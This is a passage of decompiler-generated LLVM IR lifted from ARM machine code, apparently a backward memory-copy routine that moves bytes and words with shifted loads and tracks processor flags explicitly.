  %v0_18d30 = load i32, i32* %r2.global-to-local, align 4
  %v2_18d30 = add i32 %v0_18d30, -32
  store i32 %v2_18d30, i32* %r2.global-to-local, align 4
  %v6_18d34 = icmp slt i32 %v0_18d30, 32
  br i1 %v6_18d34, label %dec_label_pc_18d38.loopexit, label %dec_label_pc_18d20.dec_label_pc_18d20_crit_edge

dec_label_pc_18d20.dec_label_pc_18d20_crit_edge:  ; preds = %dec_label_pc_18d20
  %v0_18d20.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18d20

dec_label_pc_18d38.loopexit:                      ; preds = %dec_label_pc_18d20
  %v4_18d30 = sub i32 31, %v0_18d30
  %v5_18d30 = and i32 %v4_18d30, %v0_18d30
  %v6_18d30 = icmp slt i32 %v5_18d30, 0
  %v7_18d30 = icmp slt i32 %v2_18d30, 0
  store i1 %v6_18d30, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18d30, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_18d38

dec_label_pc_18d38:                               ; preds = %dec_label_pc_18d38.loopexit, %dec_label_pc_18d14
  %v6_18d40 = phi i32 [ %v1_18d2c, %dec_label_pc_18d38.loopexit ], [ %v0_18d2449, %dec_label_pc_18d14 ]
  %v0_18d48.pr = phi i32 [ %v2_18d30, %dec_label_pc_18d38.loopexit ], [ %v2_18d18, %dec_label_pc_18d14 ]
  %v4_18d38 = add i32 %v0_18d48.pr, 16
  %v6_18d38 = sub i32 0, %v0_18d48.pr
  %v7_18d38 = and i32 %v4_18d38, %v6_18d38
  %v8_18d38 = icmp slt i32 %v7_18d38, 0
  store i1 %v8_18d38, i1* %cpsr_v.global-to-local, align 1
  %v9_18d38 = icmp slt i32 %v4_18d38, 0
  store i1 %v9_18d38, i1* %cpsr_n.global-to-local, align 1
  %v5_18d3c = icmp slt i32 %v0_18d48.pr, -16
  br i1 %v5_18d3c, label %.thread14, label %bb140

bb140:                                            ; preds = %dec_label_pc_18d38
  %v6_18d3c = load i32, i32* %r1.global-to-local, align 4
  %v7_18d3c = add i32 %v6_18d3c, -4
  %v8_18d3c = inttoptr i32 %v7_18d3c to i32*
  %v9_18d3c = load i32, i32* %v8_18d3c, align 4
  store i32 %v9_18d3c, i32* %r3.global-to-local, align 4
  %v10_18d3c = add i32 %v6_18d3c, -8
  %v11_18d3c = inttoptr i32 %v10_18d3c to i32*
  %v12_18d3c = load i32, i32* %v11_18d3c, align 4
  store i32 %v12_18d3c, i32* %r4.global-to-local, align 4
  %v13_18d3c = add i32 %v6_18d3c, -12
  %v14_18d3c = inttoptr i32 %v13_18d3c to i32*
  %v15_18d3c = load i32, i32* %v14_18d3c, align 4
  store i32 %v15_18d3c, i32* @ip, align 4
  %v16_18d3c = add i32 %v6_18d3c, -16
  %v17_18d3c = inttoptr i32 %v16_18d3c to i32*
  %v18_18d3c = load i32, i32* %v17_18d3c, align 4
  store i32 %v18_18d3c, i32* %lr.global-to-local, align 4
  store i32 %v16_18d3c, i32* %r1.global-to-local, align 4
  %v7_18d40 = add i32 %v6_18d40, -16
  %v8_18d40 = inttoptr i32 %v7_18d40 to i32*
  store i32 %v9_18d3c, i32* %v8_18d40, align 4
  %v10_18d40 = add i32 %v6_18d40, -12
  %v11_18d40 = inttoptr i32 %v10_18d40 to i32*
  %v12_18d40 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_18d40, i32* %v11_18d40, align 4
  %v13_18d40 = add i32 %v6_18d40, -8
  %v14_18d40 = inttoptr i32 %v13_18d40 to i32*
  %v15_18d40 = load i32, i32* @ip, align 4
  store i32 %v15_18d40, i32* %v14_18d40, align 4
  %v16_18d40 = add i32 %v6_18d40, -4
  %v17_18d40 = inttoptr i32 %v16_18d40 to i32*
  %v18_18d40 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_18d40, i32* %v17_18d40, align 4
  store i32 %v7_18d40, i32* %r0.global-to-local, align 4
  %v6_18d44 = load i32, i32* %r2.global-to-local, align 4
  %v7_18d44 = add i32 %v6_18d44, -16
  store i32 %v7_18d44, i32* %r2.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_18d38, %bb140
  %v6_18d50 = phi i32 [ %v7_18d40, %bb140 ], [ %v6_18d40, %dec_label_pc_18d38 ]
  %v0_18d48 = phi i32 [ %v7_18d44, %bb140 ], [ %v0_18d48.pr, %dec_label_pc_18d38 ]
  %v4_18d48 = add i32 %v0_18d48, 20
  store i32 %v4_18d48, i32* %r2.global-to-local, align 4
  %v6_18d48 = sub i32 0, %v0_18d48
  %v7_18d48 = and i32 %v4_18d48, %v6_18d48
  %v8_18d48 = icmp slt i32 %v7_18d48, 0
  store i1 %v8_18d48, i1* %cpsr_v.global-to-local, align 1
  %v9_18d48 = icmp slt i32 %v4_18d48, 0
  store i1 %v9_18d48, i1* %cpsr_n.global-to-local, align 1
  %v5_18d4c = icmp slt i32 %v0_18d48, -20
  br i1 %v5_18d4c, label %.thread16, label %bb141

bb141:                                            ; preds = %.thread14
  %v6_18d4c = load i32, i32* %r1.global-to-local, align 4
  %v7_18d4c = add i32 %v6_18d4c, -4
  %v8_18d4c = inttoptr i32 %v7_18d4c to i32*
  %v9_18d4c = load i32, i32* %v8_18d4c, align 4
  store i32 %v9_18d4c, i32* %r3.global-to-local, align 4
  %v10_18d4c = add i32 %v6_18d4c, -8
  %v11_18d4c = inttoptr i32 %v10_18d4c to i32*
  %v12_18d4c = load i32, i32* %v11_18d4c, align 4
  store i32 %v12_18d4c, i32* @ip, align 4
  %v13_18d4c = add i32 %v6_18d4c, -12
  %v14_18d4c = inttoptr i32 %v13_18d4c to i32*
  %v15_18d4c = load i32, i32* %v14_18d4c, align 4
  store i32 %v15_18d4c, i32* %lr.global-to-local, align 4
  store i32 %v13_18d4c, i32* %r1.global-to-local, align 4
  %v7_18d50 = add i32 %v6_18d50, -12
  %v8_18d50 = inttoptr i32 %v7_18d50 to i32*
  store i32 %v9_18d4c, i32* %v8_18d50, align 4
  %v10_18d50 = add i32 %v6_18d50, -8
  %v11_18d50 = inttoptr i32 %v10_18d50 to i32*
  %v12_18d50 = load i32, i32* @ip, align 4
  store i32 %v12_18d50, i32* %v11_18d50, align 4
  %v13_18d50 = add i32 %v6_18d50, -4
  %v14_18d50 = inttoptr i32 %v13_18d50 to i32*
  %v15_18d50 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_18d50, i32* %v14_18d50, align 4
  store i32 %v7_18d50, i32* %r0.global-to-local, align 4
  %v6_18d54 = load i32, i32* %r2.global-to-local, align 4
  %v7_18d54 = add i32 %v6_18d54, -12
  store i32 %v7_18d54, i32* %r2.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %.thread14, %bb141
  %v6_18d7457 = phi i32 [ %v6_18d50, %.thread14 ], [ %v7_18d50, %bb141 ]
  %v0_18d5c55 = phi i32 [ %v4_18d48, %.thread14 ], [ %v7_18d54, %bb141 ]
  %v2_18d58 = load i8*, i8** %stack_var_-8, align 4
  %v3_18d58 = ptrtoint i8* %v2_18d58 to i32
  store i32 %v3_18d58, i32* @r4, align 4
  store i32 %v8_18d14, i32* @lr, align 4
  br label %dec_label_pc_18d5c

dec_label_pc_18d5c:                               ; preds = %dec_label_pc_18d0c, %.thread16
  %v7_18d6c = phi i32 [ %v0_18d2449, %dec_label_pc_18d0c ], [ %v6_18d7457, %.thread16 ]
  %v0_18d5c = phi i32 [ %v2_18d0c, %dec_label_pc_18d0c ], [ %v0_18d5c55, %.thread16 ]
  %v2_18d5c = add i32 %v0_18d5c, 8
  store i32 %v2_18d5c, i32* %r2.global-to-local, align 4
  %v4_18d5c = sub i32 0, %v0_18d5c
  %v5_18d5c = and i32 %v2_18d5c, %v4_18d5c
  %v6_18d5c = icmp slt i32 %v5_18d5c, 0
  store i1 %v6_18d5c, i1* %cpsr_v.global-to-local, align 1
  %v7_18d5c = icmp slt i32 %v2_18d5c, 0
  store i1 %v7_18d5c, i1* %cpsr_n.global-to-local, align 1
  %v5_18d60 = icmp slt i32 %v0_18d5c, -8
  br i1 %v5_18d60, label %bb143, label %dec_label_pc_18d64

dec_label_pc_18d64:                               ; preds = %dec_label_pc_18d5c
  %v6_18d64 = add i32 %v0_18d5c, 4
  store i32 %v6_18d64, i32* %r2.global-to-local, align 4
  %v8_18d64 = sub i32 -5, %v0_18d5c
  %v9_18d64 = and i32 %v8_18d64, %v2_18d5c
  %v10_18d64 = icmp slt i32 %v9_18d64, 0
  store i1 %v10_18d64, i1* %cpsr_v.global-to-local, align 1
  %v11_18d64 = icmp slt i32 %v6_18d64, 0
  store i1 %v11_18d64, i1* %cpsr_n.global-to-local, align 1
  %v5_18d68 = icmp slt i32 %v2_18d5c, 4
  %v6_18d68 = load i32, i32* %r1.global-to-local, align 4
  %v7_18d68 = add i32 %v6_18d68, -4
  %v8_18d68 = inttoptr i32 %v7_18d68 to i32*
  %v9_18d68 = load i32, i32* %v8_18d68, align 4
  store i32 %v9_18d68, i32* %r3.global-to-local, align 4
  br i1 %v5_18d68, label %.thread20, label %bb142

.thread20:                                        ; preds = %dec_label_pc_18d64
  store i32 %v7_18d68, i32* %r1.global-to-local, align 4
  %v8_18d6c = add i32 %v7_18d6c, -4
  %v9_18d6c = inttoptr i32 %v8_18d6c to i32*
  store i32 %v9_18d68, i32* %v9_18d6c, align 4
  %v10_18d6c = load i32, i32* %r0.global-to-local, align 4
  %v11_18d6c = add i32 %v10_18d6c, -4
  store i32 %v11_18d6c, i32* %r0.global-to-local, align 4
  %v0_18d7c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb143

bb142:                                            ; preds = %dec_label_pc_18d64
  %v10_18d70 = add i32 %v6_18d68, -8
  %v11_18d70 = inttoptr i32 %v10_18d70 to i32*
  %v12_18d70 = load i32, i32* %v11_18d70, align 4
  store i32 %v12_18d70, i32* @ip, align 4
  store i32 %v10_18d70, i32* %r1.global-to-local, align 4
  %v7_18d74 = add i32 %v7_18d6c, -8
  %v8_18d74 = inttoptr i32 %v7_18d74 to i32*
  store i32 %v9_18d68, i32* %v8_18d74, align 4
  %v10_18d74 = add i32 %v7_18d6c, -4
  %v11_18d74 = inttoptr i32 %v10_18d74 to i32*
  %v12_18d74 = load i32, i32* @ip, align 4
  store i32 %v12_18d74, i32* %v11_18d74, align 4
  store i32 %v7_18d74, i32* %r0.global-to-local, align 4
  %v6_18d78 = load i32, i32* %r2.global-to-local, align 4
  %v7_18d78 = add i32 %v6_18d78, -4
  store i32 %v7_18d78, i32* %r2.global-to-local, align 4
  br label %bb143

bb143:                                            ; preds = %.thread20, %.thread26, %dec_label_pc_18d5c, %dec_label_pc_18cec, %dec_label_pc_18f20, %dec_label_pc_18eb4, %dec_label_pc_18e48, %bb142
  %v2_18d80 = phi i32 [ %v11_18d6c, %.thread20 ], [ %v0_18e1832, %.thread26 ], [ %v7_18d6c, %dec_label_pc_18d5c ], [ %v2_18cf0, %dec_label_pc_18cec ], [ %v2_18d8c65, %dec_label_pc_18f20 ], [ %v2_18d8c64, %dec_label_pc_18eb4 ], [ %v2_18d8c63, %dec_label_pc_18e48 ], [ %v7_18d74, %bb142 ]
  %v0_18d7c = phi i32 [ %v0_18d7c.pre, %.thread20 ], [ %v2_18dc0, %.thread26 ], [ %v2_18d5c, %dec_label_pc_18d5c ], [ %v2_18cf4, %dec_label_pc_18cec ], [ %v0_18d7c61, %dec_label_pc_18f20 ], [ %v0_18d7c60, %dec_label_pc_18eb4 ], [ %v0_18d7c59, %dec_label_pc_18e48 ], [ %v7_18d78, %bb142 ]
  %v1_18d7c = add i32 %v0_18d7c, 4
  store i32 %v1_18d7c, i32* @r2, align 4
  %v3_18d7c = sub i32 0, %v0_18d7c
  %v4_18d7c = and i32 %v1_18d7c, %v3_18d7c
  %v5_18d7c = icmp slt i32 %v4_18d7c, 0
  store i1 %v5_18d7c, i1* %cpsr_v.global-to-local, align 1
  %v6_18d7c = icmp slt i32 %v1_18d7c, 0
  store i1 %v6_18d7c, i1* %cpsr_n.global-to-local, align 1
  %v7_18d7c = icmp eq i32 %v1_18d7c, 0
  store i1 %v7_18d7c, i1* @cpsr_z, align 1
  br i1 %v7_18d7c, label %.thread123, label %bb144

bb144:                                            ; preds = %bb143
  %v1_18d84 = add i32 %v0_18d7c, 2
  %v3_18d84 = sub i32 -3, %v0_18d7c
  %v4_18d84 = and i32 %v3_18d84, %v1_18d7c
  %v5_18d84 = icmp slt i32 %v4_18d84, 0
  store i1 %v5_18d84, i1* %cpsr_v.global-to-local, align 1
  %v6_18d84 = icmp slt i32 %v1_18d84, 0
  store i1 %v6_18d84, i1* %cpsr_n.global-to-local, align 1
  %v7_18d84 = icmp eq i32 %v1_18d7c, 2
  store i1 %v7_18d84, i1* @cpsr_z, align 1
  %v0_18d88 = load i32, i32* %r1.global-to-local, align 4
  %v1_18d88 = add i32 %v0_18d88, -1
  %v2_18d88 = inttoptr i32 %v1_18d88 to i8*
  %v3_18d88 = load i8, i8* %v2_18d88, align 1
  %v4_18d88 = zext i8 %v3_18d88 to i32
  store i32 %v4_18d88, i32* %r3.global-to-local, align 4
  store i32 %v1_18d88, i32* %r1.global-to-local, align 4
  %v3_18d8c = add i32 %v2_18d80, -1
  %v4_18d8c = inttoptr i32 %v3_18d8c to i8*
  store i8 %v3_18d88, i8* %v4_18d8c, align 1
  %v5_18d8c = load i32, i32* %r0.global-to-local, align 4
  %v6_18d8c = add i32 %v5_18d8c, -1
  store i32 %v6_18d8c, i32* %r0.global-to-local, align 4
  %v0_18d90 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_18d90 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_18d90 = xor i1 %v0_18d90, %v1_18d90
  br i1 %v2_18d90, label %.thread122, label %bb145

bb145:                                            ; preds = %bb144
  %v3_18d90 = load i32, i32* %r1.global-to-local, align 4
  %v4_18d90 = add i32 %v3_18d90, -1
  %v5_18d90 = inttoptr i32 %v4_18d90 to i8*
  %v6_18d90 = load i8, i8* %v5_18d90, align 1
  %v7_18d90 = zext i8 %v6_18d90 to i32
  store i32 %v7_18d90, i32* %r3.global-to-local, align 4
  store i32 %v4_18d90, i32* %r1.global-to-local, align 4
  %v6_18d94 = add i32 %v5_18d8c, -2
  %v7_18d94 = inttoptr i32 %v6_18d94 to i8*
  store i8 %v6_18d90, i8* %v7_18d94, align 1
  %v8_18d94 = load i32, i32* %r0.global-to-local, align 4
  %v9_18d94 = add i32 %v8_18d94, -1
  store i32 %v9_18d94, i32* %r0.global-to-local, align 4
  %v1_18d98.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_18d98.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread122

.thread122:                                       ; preds = %bb144, %bb145
  %v7_18d9c = phi i32 [ %v9_18d94, %bb145 ], [ %v6_18d8c, %bb144 ]
  %v2_18d9c = phi i1 [ %v2_18d98.pre, %bb145 ], [ %v1_18d90, %bb144 ]
  %v1_18d9c = phi i1 [ %v1_18d98.pre, %bb145 ], [ %v0_18d90, %bb144 ]
  %v0_18d98 = load i1, i1* @cpsr_z, align 1
  %v3_18d98 = xor i1 %v2_18d9c, %v1_18d9c
  %v4_18d98 = or i1 %v0_18d98, %v3_18d98
  br i1 %v4_18d98, label %.thread123, label %bb146

bb146:                                            ; preds = %.thread122
  %v5_18d98 = load i32, i32* %r1.global-to-local, align 4
  %v6_18d98 = add i32 %v5_18d98, -1
  %v7_18d98 = inttoptr i32 %v6_18d98 to i8*
  %v8_18d98 = load i8, i8* %v7_18d98, align 1
  %v9_18d98 = zext i8 %v8_18d98 to i32
  store i32 %v9_18d98, i32* %r3.global-to-local, align 4
  store i32 %v6_18d98, i32* %r1.global-to-local, align 4
  %v8_18d9c = add i32 %v7_18d9c, -1
  %v9_18d9c = inttoptr i32 %v8_18d9c to i8*
  store i8 %v8_18d98, i8* %v9_18d9c, align 1
  %v10_18d9c = load i32, i32* %r0.global-to-local, align 4
  %v11_18d9c = add i32 %v10_18d9c, -1
  store i32 %v11_18d9c, i32* %r0.global-to-local, align 4
  br label %.thread123

dec_label_pc_18da4:                               ; preds = %dec_label_pc_18cfc
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_18da4 = icmp eq i32 %v1_18cfc, 1
  store i1 %v8_18da4, i1* %cpsr_n.global-to-local, align 1
  %v1_18da8 = add i32 %v2_18cec, -1
  %v2_18da8 = inttoptr i32 %v1_18da8 to i8*
  %v3_18da8 = load i8, i8* %v2_18da8, align 1
  %v4_18da8 = zext i8 %v3_18da8 to i32
  store i32 %v4_18da8, i32* %r3.global-to-local, align 4
  store i32 %v1_18da8, i32* %r1.global-to-local, align 4
  %v3_18dac = add i32 %v2_18cf0, -1
  %v4_18dac = inttoptr i32 %v3_18dac to i8*
  store i8 %v3_18da8, i8* %v4_18dac, align 1
  %v5_18dac = load i32, i32* %r0.global-to-local, align 4
  %v6_18dac = add i32 %v5_18dac, -1
  store i32 %v6_18dac, i32* %r0.global-to-local, align 4
  br i1 %v8_18da4, label %.thread26, label %bb147

bb147:                                            ; preds = %dec_label_pc_18da4
  %v9_18da4 = icmp eq i32 %v1_18cfc, 2
  %v6_18db0 = load i32, i32* %r1.global-to-local, align 4
  %v7_18db0 = add i32 %v6_18db0, -1
  %v8_18db0 = inttoptr i32 %v7_18db0 to i8*
  %v9_18db0 = load i8, i8* %v8_18db0, align 1
  %v10_18db0 = zext i8 %v9_18db0 to i32
  store i32 %v10_18db0, i32* %r3.global-to-local, align 4
  store i32 %v7_18db0, i32* %r1.global-to-local, align 4
  %v9_18db4 = add i32 %v5_18dac, -2
  %v10_18db4 = inttoptr i32 %v9_18db4 to i8*
  store i8 %v9_18db0, i8* %v10_18db4, align 1
  %v11_18db4 = load i32, i32* %r0.global-to-local, align 4
  %v12_18db4 = add i32 %v11_18db4, -1
  store i32 %v12_18db4, i32* %r0.global-to-local, align 4
  br i1 %v9_18da4, label %.thread26, label %bb148

bb148:                                            ; preds = %bb147
  %v8_18db8 = load i32, i32* %r1.global-to-local, align 4
  %v9_18db8 = add i32 %v8_18db8, -1
  %v10_18db8 = inttoptr i32 %v9_18db8 to i8*
  %v11_18db8 = load i8, i8* %v10_18db8, align 1
  %v12_18db8 = zext i8 %v11_18db8 to i32
  store i32 %v12_18db8, i32* %r3.global-to-local, align 4
  store i32 %v9_18db8, i32* %r1.global-to-local, align 4
  %v11_18dbc = add i32 %v11_18db4, -2
  %v12_18dbc = inttoptr i32 %v11_18dbc to i8*
  store i8 %v11_18db8, i8* %v12_18dbc, align 1
  %v13_18dbc = load i32, i32* %r0.global-to-local, align 4
  %v14_18dbc = add i32 %v13_18dbc, -1
  store i32 %v14_18dbc, i32* %r0.global-to-local, align 4
  br label %.thread26

.thread26:                                        ; preds = %bb147, %dec_label_pc_18da4, %bb148
  %v0_18e1832 = phi i32 [ %v12_18db4, %bb147 ], [ %v6_18dac, %dec_label_pc_18da4 ], [ %v14_18dbc, %bb148 ]
  %v0_18dc0 = load i32, i32* %r2.global-to-local, align 4
  %v1_18dc0 = load i32, i32* @ip, align 4
  %v2_18dc0 = sub i32 %v0_18dc0, %v1_18dc0
  store i32 %v2_18dc0, i32* %r2.global-to-local, align 4
  %v4_18dc0 = xor i32 %v1_18dc0, %v0_18dc0
  %v5_18dc0 = xor i32 %v2_18dc0, %v0_18dc0
  %v6_18dc0 = and i32 %v5_18dc0, %v4_18dc0
  %v7_18dc0 = icmp slt i32 %v6_18dc0, 0
  store i1 %v7_18dc0, i1* %cpsr_v.global-to-local, align 1
  %v8_18dc0 = icmp slt i32 %v2_18dc0, 0
  store i1 %v8_18dc0, i1* %cpsr_n.global-to-local, align 1
  %v5_18dc4 = icmp slt i32 %v0_18dc0, %v1_18dc0
  br i1 %v5_18dc4, label %bb143, label %dec_label_pc_18dc8

dec_label_pc_18dc8:                               ; preds = %.thread26
  %v0_18dc8 = load i32, i32* %r1.global-to-local, align 4
  %v1_18dc8 = urem i32 %v0_18dc8, 4
  store i32 %v1_18dc8, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18dc8 = icmp eq i32 %v1_18dc8, 0
  br i1 %v2_18dc8, label %dec_label_pc_18d0c, label %dec_label_pc_18dd0

dec_label_pc_18dd0:                               ; preds = %dec_label_pc_18d04, %dec_label_pc_18dc8
  %v0_18e1831 = phi i32 [ %v2_18cf0, %dec_label_pc_18d04 ], [ %v0_18e1832, %dec_label_pc_18dc8 ]
  %v0_18ec4 = phi i32 [ %v2_18cf4, %dec_label_pc_18d04 ], [ %v2_18dc0, %dec_label_pc_18dc8 ]
  %v0_18dd0 = phi i32 [ %v2_18cec, %dec_label_pc_18d04 ], [ %v0_18dc8, %dec_label_pc_18dc8 ]
  %v0_18dd8 = phi i32 [ %v1_18d04, %dec_label_pc_18d04 ], [ %v1_18dc8, %dec_label_pc_18dc8 ]
  %v1_18dd0 = and i32 %v0_18dd0, -4
  store i32 %v1_18dd0, i32* %r1.global-to-local, align 4
  %v1_18dd4 = inttoptr i32 %v1_18dd0 to i32*
  %v2_18dd4 = load i32, i32* %v1_18dd4, align 4
  store i32 %v2_18dd4, i32* %r3.global-to-local, align 4
  %v7_18dd8 = icmp ult i32 %v0_18dd8, 2
  %v2_18ebc = add i32 %v0_18ec4, -12
  %v4_18ebc = sub i32 11, %v0_18ec4
  %v5_18ebc = and i32 %v4_18ebc, %v0_18ec4
  %v6_18ebc = icmp slt i32 %v5_18ebc, 0
  store i1 %v6_18ebc, i1* %cpsr_v.global-to-local, align 1
  %v7_18ebc = icmp slt i32 %v2_18ebc, 0
  store i1 %v7_18ebc, i1* %cpsr_n.global-to-local, align 1
  %v5_18ec0 = icmp slt i32 %v0_18ec4, 12
  br i1 %v7_18dd8, label %dec_label_pc_18ebc, label %dec_label_pc_18de0

dec_label_pc_18de0:                               ; preds = %dec_label_pc_18dd0
  %v8_18dd8 = icmp eq i32 %v0_18dd8, 2
  br i1 %v8_18dd8, label %dec_label_pc_18e50, label %dec_label_pc_18de4

dec_label_pc_18de4:                               ; preds = %dec_label_pc_18de0
  br i1 %v5_18ec0, label %dec_label_pc_18e30, label %dec_label_pc_18dec

dec_label_pc_18dec:                               ; preds = %dec_label_pc_18de4
  store i32 %v2_18ebc, i32* %r2.global-to-local, align 4
  %v3_18df0 = load i32, i32* @r4, align 4
  store i32 %v3_18df0, i32* %stack_var_-12, align 4
  %v6_18df0 = load i32, i32* @r5, align 4
  %v8_18df0 = inttoptr i32 %v6_18df0 to i8*
  store i8* %v8_18df0, i8** %stack_var_-8, align 4
  %v11_18df0 = load i32, i32* @lr, align 4
  br label %dec_label_pc_18df4

dec_label_pc_18df4:                               ; preds = %dec_label_pc_18df4.dec_label_pc_18df4_crit_edge, %dec_label_pc_18dec
  %v0_18e18 = phi i32 [ %v1_18e18, %dec_label_pc_18df4.dec_label_pc_18df4_crit_edge ], [ %v0_18e1831, %dec_label_pc_18dec ]
  %v0_18df8 = phi i32 [ %v0_18df8.pre, %dec_label_pc_18df4.dec_label_pc_18df4_crit_edge ], [ %v1_18dd0, %dec_label_pc_18dec ]
  %v0_18df4 = phi i32 [ %v0_18df4.pre, %dec_label_pc_18df4.dec_label_pc_18df4_crit_edge ], [ %v2_18dd4, %dec_label_pc_18dec ]
  %v3_18df4 = mul i32 %v0_18df4, 256
  store i32 %v3_18df4, i32* %lr.global-to-local, align 4
  %v1_18df8 = add i32 %v0_18df8, -4
  %v2_18df8 = inttoptr i32 %v1_18df8 to i32*
  %v3_18df8 = load i32, i32* %v2_18df8, align 4
  store i32 %v3_18df8, i32* %r3.global-to-local, align 4
  %v4_18df8 = add i32 %v0_18df8, -8
  %v5_18df8 = inttoptr i32 %v4_18df8 to i32*
  %v6_18df8 = load i32, i32* %v5_18df8, align 4
  store i32 %v6_18df8, i32* %r4.global-to-local, align 4
  %v7_18df8 = add i32 %v0_18df8, -12
  %v8_18df8 = inttoptr i32 %v7_18df8 to i32*
  %v9_18df8 = load i32, i32* %v8_18df8, align 4
  store i32 %v9_18df8, i32* %r5.global-to-local, align 4
  %v10_18df8 = add i32 %v0_18df8, -16
  %v11_18df8 = inttoptr i32 %v10_18df8 to i32*
  %v12_18df8 = load i32, i32* %v11_18df8, align 4
  store i32 %v10_18df8, i32* %r1.global-to-local, align 4
  %v4_18dfc = udiv i32 %v12_18df8, 16777216
  %v5_18dfc = or i32 %v4_18dfc, %v3_18df4
  store i32 %v5_18dfc, i32* %lr.global-to-local, align 4
  %v3_18e00 = mul i32 %v12_18df8, 256
  %v4_18e04 = udiv i32 %v9_18df8, 16777216
  %v5_18e04 = or i32 %v3_18e00, %v4_18e04
  store i32 %v5_18e04, i32* @ip, align 4
  %v3_18e08 = mul i32 %v9_18df8, 256
  %v4_18e0c = udiv i32 %v6_18df8, 16777216
  %v5_18e0c = or i32 %v3_18e08, %v4_18e0c
  store i32 %v5_18e0c, i32* %r5.global-to-local, align 4
  %v3_18e10 = mul i32 %v6_18df8, 256
  %v4_18e14 = udiv i32 %v3_18df8, 16777216
  %v5_18e14 = or i32 %v3_18e10, %v4_18e14
  store i32 %v5_18e14, i32* %r4.global-to-local, align 4
  %v1_18e18 = add i32 %v0_18e18, -16
  %v2_18e18 = inttoptr i32 %v1_18e18 to i32*
  store i32 %v5_18e14, i32* %v2_18e18, align 4
  %v4_18e18 = add i32 %v0_18e18, -12
  %v5_18e18 = inttoptr i32 %v4_18e18 to i32*
  %v6_18e18 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_18e18, i32* %v5_18e18, align 4
  %v7_18e18 = add i32 %v0_18e18, -8
  %v8_18e18 = inttoptr i32 %v7_18e18 to i32*
  %v9_18e18 = load i32, i32* @ip, align 4
  store i32 %v9_18e18, i32* %v8_18e18, align 4
  %v10_18e18 = add i32 %v0_18e18, -4
  %v11_18e18 = inttoptr i32 %v10_18e18 to i32*
  %v12_18e18 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18e18, i32* %v11_18e18, align 4
  store i32 %v1_18e18, i32* %r0.global-to-local, align 4
  %v0_18e1c = load i32, i32* %r2.global-to-local, align 4
  %v2_18e1c = add i32 %v0_18e1c, -16
  store i32 %v2_18e1c, i32* %r2.global-to-local, align 4
  %v6_18e20 = icmp slt i32 %v0_18e1c, 16
  br i1 %v6_18e20, label %dec_label_pc_18e24, label %dec_label_pc_18df4.dec_label_pc_18df4_crit_edge

dec_label_pc_18df4.dec_label_pc_18df4_crit_edge:  ; preds = %dec_label_pc_18df4
  %v0_18df4.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_18df8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18df4

dec_label_pc_18e24:                               ; preds = %dec_label_pc_18df4
  %v2_18e24 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18e24, i32* @r4, align 4
  %v5_18e24 = load i8*, i8** %stack_var_-8, align 4
  %v6_18e24 = ptrtoint i8* %v5_18e24 to i32
  store i32 %v6_18e24, i32* @r5, align 4
  store i32 %v11_18df0, i32* @lr, align 4
  %v2_18e28 = add i32 %v0_18e1c, -4
  store i32 %v2_18e28, i32* %r2.global-to-local, align 4
  %v4_18e28 = add i32 %v0_18e1c, 2147483632
  %v5_18e28 = and i32 %v2_18e28, %v4_18e28
  %v6_18e28 = icmp slt i32 %v5_18e28, 0
  store i1 %v6_18e28, i1* %cpsr_v.global-to-local, align 1
  %v7_18e28 = icmp slt i32 %v2_18e28, 0
  store i1 %v7_18e28, i1* %cpsr_n.global-to-local, align 1
  %v5_18e2c = icmp slt i32 %v2_18e1c, -12
  br i1 %v5_18e2c, label %dec_label_pc_18e48, label %dec_label_pc_18e30

dec_label_pc_18e30:                               ; preds = %dec_label_pc_18e24, %dec_label_pc_18de4, %dec_label_pc_18e30
  %v1_18e3c = phi i32 [ %v5_18e3c, %dec_label_pc_18e30 ], [ %v1_18e18, %dec_label_pc_18e24 ], [ %v0_18e1831, %dec_label_pc_18de4 ]
  %v0_18e30 = load i32, i32* %r3.global-to-local, align 4
  %v3_18e30 = mul i32 %v0_18e30, 256
  store i32 %v3_18e30, i32* %ip.global-to-local, align 4
  %v0_18e34 = load i32, i32* %r1.global-to-local, align 4
  %v1_18e34 = add i32 %v0_18e34, -4
  %v2_18e34 = inttoptr i32 %v1_18e34 to i32*
  %v3_18e34 = load i32, i32* %v2_18e34, align 4
  store i32 %v3_18e34, i32* %r3.global-to-local, align 4
  store i32 %v1_18e34, i32* %r1.global-to-local, align 4
  %v4_18e38 = udiv i32 %v3_18e34, 16777216
  %v5_18e38 = or i32 %v4_18e38, %v3_18e30
  store i32 %v5_18e38, i32* @ip, align 4
  %v2_18e3c = add i32 %v1_18e3c, -4
  %v3_18e3c = inttoptr i32 %v2_18e3c to i32*
  store i32 %v5_18e38, i32* %v3_18e3c, align 4
  %v4_18e3c = load i32, i32* %r0.global-to-local, align 4
  %v5_18e3c = add i32 %v4_18e3c, -4
  store i32 %v5_18e3c, i32* %r0.global-to-local, align 4
  %v0_18e40 = load i32, i32* %r2.global-to-local, align 4
  %v2_18e40 = add i32 %v0_18e40, -4
  store i32 %v2_18e40, i32* %r2.global-to-local, align 4
  %v6_18e44 = icmp slt i32 %v0_18e40, 4
  br i1 %v6_18e44, label %dec_label_pc_18e48.loopexit, label %dec_label_pc_18e30

dec_label_pc_18e48.loopexit:                      ; preds = %dec_label_pc_18e30
  %v4_18e40 = sub i32 3, %v0_18e40
  %v5_18e40 = and i32 %v4_18e40, %v0_18e40
  %v6_18e40 = icmp slt i32 %v5_18e40, 0
  %v7_18e40 = icmp slt i32 %v2_18e40, 0
